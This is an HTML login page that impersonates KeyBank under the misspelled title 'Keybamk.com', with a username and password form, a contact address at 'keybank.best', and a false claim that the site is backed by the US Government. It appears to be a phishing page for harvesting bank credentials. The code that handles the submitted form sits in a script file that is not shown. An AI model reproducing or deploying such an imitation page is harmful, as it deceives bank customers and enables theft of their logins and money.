<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keybamk.com — Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body class="login-page">
    <main class="login-container">
        <section class="login-card">
            <div class="brand">
                <div class="brand-icon">K</div>
                <div>
                    <h1>KeyBank</h1>
                    <p>FDIC-insured-Backed by the full faith and credit of the US Government</p>
                </div>
            </div>
            <div class="demo-label">
                Secure Account
            </div>
            <h2>Welcome back</h2>
            <p class="subtitle">Sign in to view your account.</p>
            <form id="loginForm">
                <label for="username">Username</label>
                <input
                    type="text"
                    id="username"
                    placeholder="Enter your username"
                    autocomplete="off"
                    required
                >
                <label for="password">Password</label>
                <input
                    type="password"
                    id="password"
                    placeholder="Enter your password"
                    autocomplete="off"
                    required
                >
                <p id="loginError" class="error-message"></p>
                <button type="submit" class="login-button">
                    Sign in
                </button>
            </form>
            <div class="demo-info">
    <strong>Keybank best</strong>
    <p>Secure: <b>Your Finance</b></p>
    <p>Protect: <b>Your Future</b></p>
</div>
            <p class="disclaimer">
                Save and secure@keybank.best .
            </p>
        </section>
    </main>
    <script src="script.js"></script>
</body>
</html>
